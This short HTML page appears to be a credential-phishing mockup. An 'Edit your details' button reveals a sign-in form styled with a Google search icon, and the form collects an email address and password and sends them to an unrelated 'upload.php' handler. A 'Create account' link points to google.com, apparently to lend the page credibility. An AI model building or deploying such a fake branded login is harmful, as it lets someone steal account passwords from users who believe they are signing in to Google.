<!DOCTYPE html>
<html>
  <head>
    <link rel="stylesheet" type="text/css" href="login.css" />
    <style>
      .edit {
        text-align: center;
      }
    </style>
  </head>
  <body>
    <div class="edit" id="editdetails">
      <input
        type="submit"
        name="edit"
        id="editb"
        onclick="login()"
        value="Edit your details"
      />
    </div>
    <div class="form" id="glog">
      <img
        src="http://www.androidpolice.com/wp-content/themes/ap2/ap_resize/ap_resize.php?src=http%3A%2F%2Fwww.androidpolice.com%2Fwp-content%2Fuploads%2F2015%2F10%2Fnexus2cee_Search-Thumb-150x150.png&w=150&h=150&zc=3"
      />
      <form action="upload.php" enctype="multipart/form-data">
        <input type="email" name="email" placeholder="Email" />

        <input type="password" name="Password" placeholder="Password" />

        <button>Sign in</button>

        <a href="https://www.google.com/">Create account</a>
      </form>
    </div>
    <script>
      window.onload = function() {
        document.getElementById("glog").style.display = "none";
      };
      function login() {
        document.getElementById("glog").style.display = "block";
        document.getElementById("editdetails").style.display = "none";
      }
    </script>
  </body>
</html>
